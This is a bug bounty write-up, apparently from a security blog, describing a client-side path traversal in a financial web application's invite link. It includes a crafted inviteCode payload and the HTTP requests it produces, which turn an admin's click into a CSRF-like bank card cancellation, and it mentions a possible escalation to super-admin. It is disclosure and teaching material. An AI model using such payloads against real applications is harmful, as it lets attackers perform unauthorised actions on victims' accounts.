---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-09_practical-example-of-client-side-path-manipulation.md
original_filename: 2023-01-09_practical-example-of-client-side-path-manipulation.md
title: Practical Example Of Client Side Path Manipulation
category: documents
detected_topics:
- csrf
- command-injection
- path-traversal
- otp
- api-security
tags:
- imported
- documents
- csrf
- command-injection
- path-traversal
- otp
- api-security
language: en
raw_sha256: c325078c4050c65d7110573daa71e59039a5cfe3d311a5271ce7d164574070a0
text_sha256: 662d80d39ea52adfb9c09e31d6a352c5f67db0b479ed3cd00553a2e59673cd2b
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Practical Example Of Client Side Path Manipulation

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-09_practical-example-of-client-side-path-manipulation.md
- Source Type: markdown
- Detected Topics: csrf, command-injection, path-traversal, otp, api-security
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `c325078c4050c65d7110573daa71e59039a5cfe3d311a5271ce7d164574070a0`
- Text SHA256: `662d80d39ea52adfb9c09e31d6a352c5f67db0b479ed3cd00553a2e59673cd2b`


## Content

---
title: "Practical Example Of Client Side Path Manipulation"
page_title: "Client Side Path Manipulation | Erasec"
url: "https://erasec.be/blog/client-side-path-manipulation/"
final_url: "https://www.erasec.be/blog/client-side-path-manipulation/"
authors: ["Antoine Roly (@aroly)"]
bugs: ["Client-side Path Traversal"]
publication_date: "2023-01-09"
added_date: "2023-01-11"
source: "pentester.land/writeups.json"
original_index: 1685
---

# Client Side Path Manipulation

# Practical Example Of Client Side Path Manipulation

## Summary

A few months ago, I stumbled onto an interesting case of Client-Side Path Manipulation in a private bug bounty program. Since I wanted to start a blog, and I noticed that another client side path traversal was mentioned in PortSwigger’s Top 10 web hacking techniques of 2022, I thought it would be a good first article.

## The application

The application in scope was a financial application, allowing users to manage accounts, payments, cards,… Different user profiles were available (admin, regular users, read-only, …). It was possible for admin users to invite other employees, contractors or business relationships to create an account on the platform. Nothing unusual regarding the invite flow: an email was sent to the invited user, with an activation link like the following:

`https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789`

### The normal flow

When the user follows the link, they end up on the main application. After the initial GET request, some JS files are downloaded and a POST request is generated and sent to the backend host. This POST request looks like:
  
  
  POST /invite/123456789/check HTTP/1.1
  Host: backend.example.com
  X-Xsrf-Token: My-CSRF-TOKEN
  Content-Type: application/json
  Content-Length: 41
  
  {"email":"foo@bar.com"}
  

As we can see, the POST request contains the inviteCode in the URL (../123456789/…) and the email in the request body.

### The poisoned invite flow

While testing, I noticed that if we modify the original inviteCode from

`inviteCode=123456789`

to

`inviteCode=123456789/../../../FOO`,

the flow will be different. With a link like:

`https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789/../../../FOO`

after the initial GET request, the POST request to the backend will be:
  
  
  POST /FOO/check HTTP/1.1
  Host: backend.example.com
  Content-Type: application/json
  X-Xsrf-Token: My-CSRF-TOKEN
  Content-Length: 41
  Origin: https://example.com
  Connection: close
  
  {"email":"foo@bar.com"}
  

As we can see, the modified inviteCode contains a path traversal payload which changes the POST request’s destination URL. Importantly, because the Javascript code is executed normally to build the request, the POST includes the CSRF header X-Xsrf-Token: My-CSRF-TOKEN and (obviously) the session cookies.

### Target Endpoints

Since we don’t have control over the POST request body but only the URL, it was time to go through my Burp History to look for target endpoints, i.e. endpoints that would accept a request with an empty or a JSON body with a single email parameter.

Luckily for me, I found several endpoints accepting a POST request with an empty JSON body ({}). One such request was the endpoint to cancel a bank card. The normal request looks like:
  
  
  POST /cards/123e4567-e89b-42d3-a456-556642440000/cancel HTTP/1.1
  Host: backend.example.com
  Cookie:  <...TRIMMED...>
  Content-Type: application/json
  X-Xsrf-Token: MY-CSRF-TOKEN
  Content-Length: 2
  Origin: https://example.com
  Connection: close
  
  {}
  

There is no parameter in the URL or the body, which makes it a good candidate. I quickly checked that the endpoint was accepting POST requests with a non emtpy body, and it was the case.

### The attack

It was now possible to use this client side path traversal on the target endpoint shown above, by sending this specially crafted link to an admin:

`https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=`

The inviteCode has been modified to

  * change the final destination, with a path traversal payload 123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel
  * get rid of the appended /check suffix, by adding a ?a= parameter.

If an authenticated admin follows the link, the resulting POST request sent to the backend will be:
  
  
  POST /cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=/check HTTP/1.1
  Host: backend.example.com
  Accept: application/json; charset=utf-8
  X-Xsrf-Token: MY-CSRF-TOKEN
  Content-Length: 41
  Origin: https://example.com
  
  {"email":"foo@bar.com"}
  

The body is also sent but as we have seen, it is ignored by the server and the request is accepted:
  
  
  HTTP/1.1 200 OK
  Date: Thu, 10 Nov 2022 09:59:05 GMT
  Content-Type: text/plain; charset=utf-8
  Content-Length: 0
  Connection: close
  
  [ ... Trimmed for brievety... ]
  

As a result, it was possible to create a kind of CSRF attack and in this case, to cancel a bank card with just one click of an authenticated admin user.

### Bonus

After the initial report, and while I was exploring the application, I discovered a page aimed for super-admin (i.e. admin users from the vendor, not the customers). One of the endpoint listed on the page was expecting the exact same kind of request I was able to send using the client side path traversal: a POST request with a body containing a single email parameter. To my understanding, the endpoint was used to whitelist email addresses and avoid all security checks, making the user a super-admin. So if it was possible to trick an authenticated super-admin to follow a poisoned link to this endpoint, it could allow me to escalate my privileges to super-admin.

Thanks for reading !

A.
